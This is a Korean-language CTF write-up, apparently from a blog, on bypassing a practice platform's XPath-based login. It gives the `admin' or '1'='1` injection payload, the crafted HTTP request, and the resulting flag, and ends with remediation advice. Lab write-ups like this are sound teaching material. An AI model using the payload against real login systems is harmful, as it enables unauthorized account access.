+++
title = "VulnABLE CTF [LUXORA] Write-up: XPath Injection 🥉 Bronze"
description = "LUXORA 플랫폼의 XPath Injection 취약점을 이용한 기본 인증 우회 상세 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "XPath Injection", "Bronze", "Auth Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: XPath Injection 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (XPath Injection)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/xpath/bronze`
- **목표**: XML 데이터를 쿼리하는 XPath 엔진의 검증 부재를 악용하여 논리 연산을 조작하고 인증을 우회하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 분석 (Reconnaissance)

`/xpath/bronze` 경로는 고전적인 사용자 로그인 페이지입니다. Username과 Password를 입력받습니다.

과거 레거시 시스템이나 특정 설정 파일(SSO 연동 등) 기반의 인증 시스템은 데이터베이스(DB) 대신 **XML 파일**에 사용자 정보를 저장하는 경우가 종종 있습니다. 이때 XML 데이터를 검색하기 위해 사용하는 언어가 **XPath** 입니다.

**[정상 로그인 시나리오]**
- 사용자: `alice` / 비밀번호: `password123` 
- 결과: 정상 로그인 (일반 권한)

**[해커의 사고 과정]**
1. 이 시스템이 SQL이 아닌 XML(XPath)을 사용하고 있다면, SQL Injection의 기본 공격인 `' OR '1'='1` 이 여기서도 똑같이 통할까?
2. XPath 문자열의 문법적 구조를 깨뜨려보자.

---

## 💥 2. 취약점 검증 및 페이로드 설계 (Exploitation)

일반적인 XPath 로그인 쿼리문은 다음과 같이 생겼습니다.
```xpath
//User[Username/text()='입력한_아이디' and Password/text()='입력한_비번']
```

이 쿼리 구조에 SQL Injection과 동일한 논리 폭탄(`' or '1'='1`)을 주입해 봅니다.

### 💡 페이로드 작성
* Username: `admin' or '1'='1`
* Password: `anything`

이 값이 서버로 넘어가면 완성되는 쿼리:
```xpath
//User[Username/text()='admin' or '1'='1' and Password/text()='anything']
```

*(참고: 논리 연산자 우선순위에 따라 `AND`가 먼저 묶이거나, 쿼리가 통째로 참이 되면서 첫 번째 노드인 관리자(admin)를 반환하게 됩니다.)*

---

## 🚀 3. 공격 수행 및 결과 확인

Burp Suite 또는 브라우저의 폼을 통해 조작된 값을 전송합니다.

```http
POST /xpath/bronze HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'%20or%20'1'='1&password=test
```

### 🔍 서버의 응답
XPath 쿼리 전체가 `True`로 평가되면서, XML 문서의 가장 첫 번째 노드에 위치한(보통 관리자) 사용자 객체가 반환됩니다.

```html
<div class="dashboard">
  <h2>Welcome, admin</h2>
  <p>Your Role: Administrator</p>
  <p class="flag">FLAG{XPATH_🥉_AUTH_BYPASS_E9F1A2}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

XML 쿼리 언어인 XPath 환경에서도 문자열 검증 부재로 인한 인젝션 공격이 SQL과 동일한 원리로 성립함을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{XPATH_🥉_AUTH_BYPASS_E9F1A2}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자 입력값을 XML 쿼리 구조 내부에 단순 문자열 결합(`+`)으로 처리한 것이 원인입니다.

* **안전한 패치 가이드**
1. **사전 컴파일된 쿼리 (Precompiled XPath)**: SQL의 Prepared Statement처럼 XPath 엔진(예: Python의 `lxml`, Java의 `XPathExpression`)에서도 매개변수화된 쿼리 기능을 지원합니다. 이 기능을 사용하여 입력값을 데이터로만 취급해야 합니다.
2. **입력값 검증 (Input Validation)**: 홑따옴표(`'`), 쌍따옴표(`"`), 대괄호(`]`) 등 구조를 변경할 수 있는 문자는 HTML 엔티티로 치환하거나 필터링해야 합니다.